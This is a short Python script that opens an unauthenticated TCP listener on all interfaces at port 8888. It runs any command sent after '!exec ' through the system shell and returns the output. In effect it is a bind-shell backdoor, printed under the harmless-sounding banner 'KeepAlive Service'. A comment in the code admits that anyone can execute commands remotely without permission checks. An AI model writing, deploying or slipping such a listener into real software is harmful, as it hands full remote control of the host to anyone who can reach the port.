import socket
import threading
import os  # <-- dangerous
#Dont run this in a bad spot, people can execute commands on your machine remotely without checking for permissions.
HOST = '0.0.0.0'#ports that it accepts
PORT = 8888
print("Listening on:", socket.gethostbyname(socket.gethostname()))
def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")
    try:
        while True:
            data = conn.recv(1024)
            if not data or data.strip() == b"exit":
                break
            if data.startswith(b"!exec "):
                output = os.popen(data[6:].decode()).read()
                conn.sendall(output.encode())
            else:
                conn.sendall(b"Command not recognized\n")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        conn.close()
        print(f"[-] Disconnected {addr}")


def main():
    print("[*] KeepAlive Service Started")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()

if __name__ == "__main__":
    main()